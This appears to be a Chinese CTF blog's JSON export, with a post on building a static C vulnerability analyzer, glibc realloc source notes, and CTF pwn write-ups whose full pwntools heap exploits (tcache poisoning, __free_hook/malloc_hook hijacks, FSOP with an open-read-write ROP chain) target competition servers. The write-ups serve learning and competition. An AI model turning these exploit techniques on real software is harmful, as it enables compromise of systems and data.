{"meta":{"title":"C12en","subtitle":"","description":"","author":"C12en","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-09-14T17:14:01.000Z","updated":"2023-09-14T17:14:32.000Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":"if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }"},{"title":"about","date":"2023-09-14T17:14:53.000Z","updated":"2024-11-13T10:48:22.000Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }"},{"title":"search","date":"2023-09-14T16:45:56.000Z","updated":"2023-09-14T16:46:20.000Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":"if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }"}],"posts":[{"title":"静态程序分析大作业设计过程","slug":"静态程序分析大作业设计过程","date":"2025-02-20T01:12:14.000Z","updated":"2025-02-26T05:58:20.052Z","comments":true,"path":"2025/02/20/静态程序分析大作业设计过程/","link":"","permalink":"http://example.com/2025/02/20/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%A4%A7%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言初步了解了静态代码分析器的概念以及如何实现目前只打算实现 c和python两种语言的代码分析前者用pycparser库 后者用ast库 后面如果找到更好的方案再进行替换 Cast树分析打算先从c语言的代码分析开始做 毕竟比较熟悉c的代码安全隐患pycparser库默认是不支持预处理语句的 比如#define和#include要么是自己删除或者就是使用fake_libc_include来提前处理好个人更偏向于前一种办法吧 后者输出的节点实在太多了 感觉会影响到处理效率(主要还是一开始不熟悉 看的头都大了 后面再看看怎么优化) import astfrom pycparser import c_parser, parse_fileast = parse_file(&quot;test.c&quot;, use_cpp = True, cpp_path=r&#x27;D:\\环境\\c\\mingw64\\bin\\gcc.exe&#x27;, cpp_args=[&#x27;-E&#x27;, r&#x27;-Ifake_libc_include&#x27;])print(ast) import astfrom pycparser import c_parser, parse_fileast = parse_file(&quot;test.c&quot;)print(ast) 按照上述代码输出一个简单c语言代码的ast语法树 int main()&#123; printf(&quot;%s&quot;,&quot;hello\\n&quot;); return 0;&#125; 输出结果如下图FileAST是根目录类型 其包括3种 也只有3种下级节点 Decl: 变量声明节点 FuncDef: 函数声明节点 TypeDef: typedef数据类型定义以上述的语法树为例 其只包括FuncDef节点 FuncDef一共有3个属性self.decl 表示一个标识符的声明 包含FuncDecl的decl节点self.coord 标识符字符串所在行列self.body 函数实现的代码块 先从decl节点开始看其又包括7个下级节点 quals表示函数是否有特定的修饰符 例如const int main()就是有特定修饰符constalign表示函数是否有对齐要求storage表示函数是否有存储类修饰符 例如staticfuncspec表示函数是否有函数规格修饰符 例如内联汇编inlineinit表示函数是否有初始值 通常用于变量声明 函数声明中为0bitsize表示变量在声明时是否有限制位数 FuncDecl有两个属性args和typeargs表示该函数的定义是否有参数type表示该函数的返回类型 type中又分为declname quals align type四个下级节点其他节点已经介绍过了 declname就是函数的名称 接着往下看 param_decls负责记录函数所需要的参数 比如int main(int a) 就会记录a下来 接着来看body部分block_items是一个列表 包含代码块中的所有语句 这里就是printf和return两个FuncCall有两个下级节点 name记录调用的函数名 args记录函数调用到的参数 根据上面所学到的 如果这里想要检测代码是否调用了危险函数 就是检查body-&gt;FuncCall-&gt;name 查出来后还可以通过coord属性输出危险函数位于第几行 import astfrom pycparser import c_parser, parse_filefrom pycparser.c_ast import *ast = parse_file(&quot;test.c&quot;,use_cpp=False)for i in ast.ext[0].body.block_items: if isinstance(i,FuncCall): if i.name.name == &quot;gets&quot;: print(f&quot;代码中调用了危险函数gets 行号：&#123;i.coord.line&#125;&quot;) 安全规则设置捋清楚了ast树的结构后 接下来的难点就是在于如何设置分析规则 感觉头都大了比如下面这一小段代码 首先要检测出来使用了危险函数 然后还要检测出来数组buf只定义了0x20字节 而read函数往buf数组里写了0x30字节 然后还得检测printf涉及到的参数只有一个 随后去检测这个参数是否为用户可控的 从而判断是否存在格式化字符漏洞我觉得最大的难点在于怎么判断参数是否为用户可控的 这就意味着需要遍历block_items的所有成员 去逐个判断当前函数是否为输入函数or可往数组中写入数据的函数 少一个都得漏报…. 不过简单粗暴一点就是检测出来printf就一个参数直接一棒打死就行了(不过万一写代码的只是写了一个printf(“hello”)呢) int main()&#123; char buf[0x20]; gets(buf); read(0,buf,0x30); printf(buf);&#125; 参考文章https://blog.csdn.net/weixin_41238626/article/details/138434837https://blog.csdn.net/csdnnews/article/details/105592032https://blog.csdn.net/m0_56208280/article/details/132238997https://blog.51cto.com/u_16213708/7081217 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"s8强网杯总决赛","slug":"s8强网杯总决赛","date":"2024-12-20T14:31:21.000Z","updated":"2024-12-20T14:34:48.000Z","comments":true,"path":"2024/12/20/s8强网杯总决赛/","link":"","permalink":"http://example.com/2024/12/20/s8%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B/","excerpt":"","text":"前言距离强网打完已经两周了 这两周因为忙着各种期末大作业和期末考试 到现在才有空写wp 结果发现已经把内容忘了差不多了。。。。 不过也没什么好讲解的 考察的都是比较简单的堆漏洞 难点只是需要自己构造chunk来实现一些漏洞的利用 需要攻击者对于堆的各种机制比较熟悉 以及放开思维思考 ez_heapfrom pwn import*import base64from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpad#io = process(&quot;./pwn&quot;)io = remote(&quot;8.147.129.227&quot;,34825)elf = ELF(&quot;./pwn&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;libc-2.31.so&quot;)def debug(): gdb.attach(io) pause()def encode_add(payload): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;Enter the text to encode: &quot;) io.send(payload)def decode_add(payload): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Enter the text to decode: &quot;) encoded = base64.b64encode(payload) print(len(encoded)/4*3/16) io.send(encoded)def remove_encode(index): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def remove_decode(index): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def show_encode(index): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;5&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def show_decode(index): io.recvuntil(&quot;Enter your choice: &quot;) io.sendline(&quot;6&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))# gdb.attach(io,&#x27;b *$rebase(0x205B)&#x27;)show_encode(-51)# pause()io.recv()elf_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x5008success(&quot;elf_addr :&quot;+hex(elf_addr))payload = cyclic(0x100)for i in range(12): decode_add(payload)for i in range(5,12): remove_decode(i)remove_decode(0)decode_add(cyclic(0x9))#0show_decode(0)io.recv()libc_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-227-libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))remove_decode(2)remove_decode(4)decode_add(cyclic(0xe0))#2decode_add(cyclic(0x9))#4show_decode(4)io.recv()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x663success(&quot;heap_addr :&quot;+hex(heap_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]decode_add(p64(free_hook))success(&quot;elf_addr :&quot;+hex(elf_addr))decode_add(p64(heap_addr+0x500))#5for i in range(8): decode_add(cyclic(0x100))decode_add(cyclic(0xa0))for i in range(7,14): remove_decode(i)for i in range(7): decode_add(b&quot;k&quot;*0x10)for i in range(7,14): remove_decode(i) system_addr = libc_addr + libc.sym[&#x27;system&#x27;]# gdb.attach(io,&#x27;b *$rebase(0x1F7C)&#x27;)number = (heap_addr+0x500)-(elf_addr+0x51a0)a = number // 8remove_decode(a+40)remove_decode(4)remove_decode(6)for i in range(7): decode_add(cyclic(0x8))decode_add(p64(free_hook))decode_add(p64(free_hook))remove_decode(1)remove_decode(2)decode_add(b&quot;/bin/sh\\x00&quot;)decode_add(p64(system_addr))remove_decode(1)io.interactive() heapfrom pwn import*from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpad#io = process(&quot;./pwn&quot;)io = remote(&quot;47.94.85.95&quot;,20682)elf = ELF(&quot;./pwn&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;libc.so.6&quot;)def debug(): gdb.attach(io) pause()def add(idx,content): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(idx)) io.recvuntil(&quot;content: &quot;) io.send(content)def delete(idx): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(idx))def show(idx): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;idx: &quot;) io.send(str(idx))def edit(idx,content): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(idx)) io.recvuntil(&quot;content: &quot;) io.send(content)add(0,cyclic(0x16))delete(0)show(&quot;0&quot;)elf_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1bf0success(&quot;elf_addr :&quot;+hex(elf_addr))add(1,&quot;a&quot;)delete(1)edit(1,cyclic(0x10))delete(1)edit(1,b&#x27;\\xa0&#x27;)add(2,&quot;a&quot;)add(3,&quot;a&quot;*8)def encrypt(data, key): # 创建AES-ECB加密器 cipher = AES.new(key, AES.MODE_ECB) # 填充数据 padded_data = pad(data, AES.block_size) # 加密 encrypted_data = cipher.encrypt(padded_data) return encrypted_datakey = b&quot;aaaaaaaa&quot;.ljust(16,b&#x27;\\x00&#x27;)show(0)pre_data = io.recv(16)data = encrypt(pre_data,key)heap_addr = data[:6]heap_addr = u64(heap_addr.ljust(8,b&#x27;\\x00&#x27;))-0x261success(&quot;heap_addr :&quot;+hex(heap_addr))add(6,cyclic(0x10))for i in range(50): add(4,&quot;aaaa&quot;)delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x2f8))add(4,&quot;aaaa&quot;)add(5,p64(0x561))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x858))add(4,&quot;aaaa&quot;)add(4,p64(0x21))delete(6)show(6)pre_data = io.recv(16)data = encrypt(pre_data,key)libc_addr = data[:6]libc_addr = u64(libc_addr.ljust(8,b&#x27;\\x00&#x27;))-96-libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]IO_list_all = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x20))add(4,&quot;aaaa&quot;)payload = b&#x27;\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00&#x27;add(4,payload)add(4,&quot;aaaa&quot;)add(4,&quot;aaaa&quot;)add(4,&quot;aaaa&quot;)add(4,&quot;aaaa&quot;)delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x2f8))add(4,&quot;aaaa&quot;)add(4,p64(0xc1))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x300))add(4,&quot;aaaa&quot;)add(4,&quot;aaaa&quot;)delete(4)add(4,&quot;aaaa&quot;)delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x870))add(4,&quot;aaaa&quot;)add(10,p64(0))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x878))add(4,&quot;aaaa&quot;)add(4,p64(0x441))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x880))add(4,&quot;aaaa&quot;)add(4,&quot;aaaa&quot;)delete(4)delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x418))add(4,&quot;aaaa&quot;)add(4,p64(IO_list_all-0x20))add(4,&quot;aaaa&quot;)IO_wfile_jumps = libc_addr + libc.sym[&#x27;_IO_wfile_jumps&#x27;]delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x898))add(4,&quot;aaaa&quot;)add(4,p64(1))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x888))add(4,&quot;aaaa&quot;)add(4,p64(0))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x910))add(4,&quot;aaaa&quot;)add(4,p64(heap_addr+0x300))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x948))add(4,&quot;aaaa&quot;)add(4,p64(IO_wfile_jumps))setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x368))add(4,&quot;aaaa&quot;)add(4,p64(setcontext))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x318))add(4,&quot;aaaa&quot;)add(4,p64(0))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x3a0))add(4,&quot;aaaa&quot;)add(4,p64(heap_addr+0x300+0xf0))ret_addr = elf_addr + 0x000000000000101adelete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x3a8))add(4,&quot;aaaa&quot;)add(4,p64(ret_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x3e0))add(4,&quot;aaaa&quot;)add(4,p64(heap_addr+0x300))rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_r12_addr = libc_addr + 0x0000000000119431read_addr = libc_addr + libc.sym[&#x27;read&#x27;]open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x3f0))add(4,&quot;aaaa&quot;)add(4,p64(rdi_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x600))add(4,&quot;aaaa&quot;)add(4,b&#x27;flag\\x00\\x00\\x00\\x00&#x27;)flag_addr = heap_addr + 0x600delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x3f8))add(4,&quot;aaaa&quot;)add(4,p64(flag_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x400))add(4,&quot;aaaa&quot;)add(4,p64(rsi_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x410))add(4,&quot;aaaa&quot;)add(4,p64(open_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x418))add(4,&quot;aaaa&quot;)add(4,p64(rdi_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x420))add(4,&quot;aaaa&quot;)add(4,p64(3))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x428))add(4,&quot;aaaa&quot;)add(4,p64(rsi_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x430))add(4,&quot;aaaa&quot;)add(4,p64(heap_addr+0xb00))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x438))add(4,&quot;aaaa&quot;)add(4,p64(rdx_r12_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x440))add(4,&quot;aaaa&quot;)add(4,p64(0x100))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x448))add(4,&quot;aaaa&quot;)add(4,p64(0))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x450))add(4,&quot;aaaa&quot;)add(4,p64(read_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x458))add(4,&quot;aaaa&quot;)add(4,p64(rdi_addr))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x460))add(4,&quot;aaaa&quot;)add(4,p64(1))delete(0)edit(0,cyclic(0x10))delete(0)edit(0,p64(heap_addr+0x468))add(4,&quot;aaaa&quot;)add(4,p64(write_addr))# gdb.attach(io,&#x27;b *_IO_wdoallocbuf+43&#x27;)delete(100)# pause()flag = io.recvuntil(&quot;&#125;&quot;)print(flag)if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"网鼎杯半决赛","slug":"网鼎杯半决赛","date":"2024-11-23T07:36:04.000Z","updated":"2024-12-20T14:30:24.000Z","comments":true,"path":"2024/11/23/网鼎杯半决赛/","link":"","permalink":"http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/","excerpt":"","text":"cardmaster赛时wp超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉不过说实话这题就是纯靠动调猜出来的主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了 主要的时间卡在了泄露libc这一步拿到libc地址后 就是想办法覆盖输出函数指针了 但是试了很久都没找到办法像刚才一样来构造double free 最后试了出来 利用realloc来把0x30的chunk放到tcachebin中 然后调用初始化函数就可以申请出来两个0x30的chunk 然后edit的时候 就可以进入malloc那个分之 就能把0x30的chunk申请出来了 而且这个chunk还是可以自定义地址的 然后就是打malloc_hook了 三个ogg的条件正常都没有办法实现 这里用realloc和malloc相结合的办法可以打通 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;83.43.93.13&quot;,15000)elf = ELF(&quot;./pwn&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;libc.so.6&quot;)def debug(): gdb.attach(io) pause()def init_card(): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;1&quot;)def edit_card(count,number,level,payload): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;suit count:&quot;) io.sendline(str(count)) io.recvuntil(&quot;digit range 1 - ?&quot;) io.sendline(str(number)) io.recvuntil(&quot;randomize level:&quot;) io.sendline(str(level)) io.recvuntil(&quot;new suite set:&quot;) io.send(payload)def shuffle_card(): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;4&quot;)def show_card(): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;5&quot;)def get_info(): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(&quot;3&quot;)# gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)edit_card(0,1,100,&quot;2\\n&quot;)io.recvuntil(&quot;suit count:&quot;)io.sendline(str(0))io.recvuntil(&quot;digit range 1 - ?&quot;)io.sendline(str(1))io.recvuntil(&quot;randomize level:&quot;)io.sendline(str(100))io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(&quot;2&quot;)# gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)io.recvuntil(&quot;suit count:&quot;)io.sendline(str(0))io.recvuntil(&quot;digit range 1 - ?&quot;)io.sendline(str(1))io.recvuntil(&quot;randomize level:&quot;)io.sendline(str(100))# pause()get_info()io.recvuntil(&quot;suit chara set:&quot;)heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))success(&quot;heap_addr :&quot;+hex(heap_addr))edit_card(300,0,100,&quot;\\xa0&quot;)# gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)edit_card(11,0,100,&quot;\\xa0&quot;)# pause()edit_card(11,0,100,p64(heap_addr-0x3c8))edit_card(1,1,100,&quot;\\xa0&quot;)# gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)edit_card(1,1,100,&quot;a&quot;)# pause()init_card()# gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)edit_card(2,0,100,p64(heap_addr-0x640+0xa30))# pause()# gdb.attach(io,&#x27;b *$rebase(0xB10)&#x27;)get_info()io.recvuntil(&quot;suit chara set:&quot;)libc_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3ebca0success(&quot;libc_addr :&quot;+hex(libc_addr))# # pause()edit_card(8,0,100,&quot;a&quot;)edit_card(12,0,100,&quot;a&quot;)edit_card(1,0,100,&quot;a&quot;)edit_card(8,0,100,&quot;a&quot;)edit_card(1,0,100,&quot;a&quot;)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]onegadget_addr = libc_addr + 0x10a38c# gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)edit_card(8,0,100,p64(realloc_hook-0x10))# pause()# gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)init_card()# pause()# gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]edit_card(8,0,100,p64(0)*2+p64(onegadget_addr)+p64(realloc_addr+0x6))# pause()# gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)init_card()# pause()io.interactive() 后记 realloc详解专门研究了一下realloc 发现还有平时不知道的很多用法realloc函数主要用于重新分配内存空间 可以调整已分配的内存空间 void *realloc(void *ptr, size_t size) ptr指向需要重分配的chunk指针 size表示的需要分配的大小来看看正常情况下的realloc如何运作 //gcc -o test -g ./test.c#include &lt;stdio.h&gt; #include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;void init()&#123; setvbuf(stdout, 0, 0, 0); setvbuf(stdin, 0, 2, 0);&#125;int main() &#123; init(); char *ptr = malloc(0x30); realloc(ptr,0x10);&#125; 执行realloc之前的ptr如下图所示执行之后 原先的chunk就重新分配成了0x20 剩下的0x20被释放进入bin中这里注意的是 虽然重分配的大小是0x10 按理来说0x30的chunk分配掉0x10 那剩余的实际大小应该是0x20 但是最终两个chunk的实际大小都是0x10 是为了考虑到不破坏原有的堆结构此时如果把realloc函数的ptr参数修改为0 来看看会是什么效果由于没有需要重分配的chunk 所以这里直接申请了一个新的chunk如果把realloc函数的size参数修改为0则会直接把chunk释放进入bin中如果size的大小大于chunk原本的大小呢则会直接扩大chunk的size如果chunk1后面再跟一个chunk2来固定大小呢 这个时候chunk1没法直接向高地址扩大可以看到取而代之的办法就是直接释放chunk1 然后重新申请一个满足size的chunk //gcc -o test -g ./test.c#include &lt;stdio.h&gt; #include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;void init()&#123; setvbuf(stdout, 0, 0, 0); setvbuf(stdin, 0, 2, 0);&#125;int main() &#123; init(); char *ptr = malloc(0x30); char *ptr1 = malloc(0x30); char *ptr2 = malloc(0x10); free(ptr1); realloc(ptr,0x30);&#125; 这里猜测realloc重分配的逻辑是先释放再申请 这里先释放一个0x30大小的chunk 再进行realloc 看看重新分配后的指针是指向哪一个chunk依然指向的是chunk0和设想的有点不一样 这里去查看下realloc的注释按照源码所说 当重分配的size大于原有的size时 会采用malloc-copy-free的操作序列 也就是先申请满足大小的chunk 再转移数据 最后释放原来的chunk但是上面我们已经实验过 当tcachebin中存在满足大小的chunk时 他也不会去申请哪怕把tcachebin换成unsortedbin也是同理那还是得根据realloc的源代码来查看一下详细的逻辑(以下源码版本为glibc2.35 中文注释为我所记) void *__libc_realloc (void *oldmem, size_t bytes)&#123; mstate ar_ptr; INTERNAL_SIZE_T nb; /* padded request size */ void *newp; /* chunk to return */ if (!__malloc_initialized) //检测堆是否初始化 ptmalloc_init ();#if REALLOC_ZERO_BYTES_FREES //这个的值默认为1 当bytes为0且指针不为空时 realloc相当于free函数 if (bytes == 0 &amp;&amp; oldmem != NULL) &#123; __libc_free (oldmem); return 0; &#125;#endif /* realloc of null is supposed to be same as malloc */ if (oldmem == 0) //当指针为空时 realloc相当于malloc函数 return __libc_malloc (bytes); /* Perform a quick check to ensure that the pointer&#x27;s tag matches the memory&#x27;s tag. */ if (__glibc_unlikely (mtag_enabled)) *(volatile char*) oldmem; /* chunk corresponding to oldmem */ //获取内存块指针以及内存块大小 const mchunkptr oldp = mem2chunk (oldmem); /* its size */ const INTERNAL_SIZE_T oldsize = chunksize (oldp); if (chunk_is_mmapped (oldp)) //检测是否通过mmap方式分配的内存 malloc函数申请的内存空间是由brk得到的 ar_ptr = NULL; else &#123; MAYBE_INIT_TCACHE (); ar_ptr = arena_for_chunk (oldp); &#125; /* Little security check which won&#x27;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by &quot;design&quot; from some intruder. */ if ((__builtin_expect ((uintptr_t) oldp &gt; (uintptr_t) -oldsize, 0) //检查内存块大小是否小于零以及指针是否对齐 || __builtin_expect (misaligned_chunk (oldp), 0))) malloc_printerr (&quot;realloc(): invalid pointer&quot;); if (!checked_request2size (bytes, &amp;nb)) //检查申请的bytes大小 &#123; __set_errno (ENOMEM); return NULL; &#125; if (chunk_is_mmapped (oldp)) &#123; void *newmem;#if HAVE_MREMAP //默认为0 作用是为1时让realloc使用mremap来重分配大chunk newp = mremap_chunk (oldp, nb); if (newp) &#123; void *newmem = chunk2mem_tag (newp); /* Give the new block a different tag. This helps to ensure that stale handles to the previous mapping are not reused. There&#x27;s a performance hit for both us and the caller for doing this, so we might want to reconsider. */ return tag_new_usable (newmem); &#125;#endif /* Note the extra SIZE_SZ overhead. */ if (oldsize - SIZE_SZ &gt;= nb) //SIZE_SZ表示chunk的元数据 如果chunk大小大于bytes 就直接返回chunk指针 return oldmem; /* do nothing */ /* Must alloc, copy, free. */ newmem = __libc_malloc (bytes); //这里就是比较关键的逻辑了 如果原有的chunk空间不够重分配 那么就调用malloc(bytes) 然后把旧chunk的内容copy到新chunk if (newmem == 0) return 0; /* propagate failure */ memcpy (newmem, oldmem, oldsize - CHUNK_HDR_SZ); munmap_chunk (oldp); //释放旧chunk return newmem; &#125; if (SINGLE_THREAD_P) //单线程情况下的重分配 &#123; newp = _int_realloc (ar_ptr, oldp, oldsize, nb); assert (!newp || chunk_is_mmapped (mem2chunk (newp)) || ar_ptr == arena_for_chunk (mem2chunk (newp))); return newp; &#125; //多线程 __libc_lock_lock (ar_ptr-&gt;mutex); newp = _int_realloc (ar_ptr, oldp, oldsize, nb); __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!newp || chunk_is_mmapped (mem2chunk (newp)) || ar_ptr == arena_for_chunk (mem2chunk (newp))); //内存分配失败时的异常处理 if (newp == NULL) &#123; /* Try harder to allocate memory in other arenas. */ LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem); newp = __libc_malloc (bytes); if (newp != NULL) &#123; size_t sz = memsize (oldp); memcpy (newp, oldmem, sz); (void) tag_region (chunk2mem (oldp), sz); _int_free (ar_ptr, oldp, 0); &#125; &#125; return newp;&#125; 重点关注的部分就是malloc-copy-free这个流程了 当oldp的size不满足bytes的时候 就会触发 但是我们之前的实验却没有成功 不过因为libc_realloc函数中的mcf流程只存在于if (chunk_is_mmapped (oldp))这个分支中 需要chunk由mmap分配的才行 所以接下来需要接着分析int_realloc函数 _int_realloc (mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb)&#123; mchunkptr newp; /* chunk to return */ INTERNAL_SIZE_T newsize; /* its size */ void* newmem; /* corresponding user mem */ mchunkptr next; /* next contiguous chunk after oldp */ mchunkptr remainder; /* extra space at end of newp */ unsigned long remainder_size; /* its size */ /* oldmem size */ if (__builtin_expect (chunksize_nomask (oldp) &lt;= CHUNK_HDR_SZ, 0) //检查oldp的大小是否小于等于chunk头大小 如果小于等于 那么oldp明显不正常 || __builtin_expect (oldsize &gt;= av-&gt;system_mem, 0)) //检查oldsize是否大于等于系统内存总量 malloc_printerr (&quot;realloc(): invalid old size&quot;); check_inuse_chunk (av, oldp); //检查oldp指向的内存块是否处于使用中 /* All callers already filter out mmap&#x27;ed chunks. */ assert (!chunk_is_mmapped (oldp)); 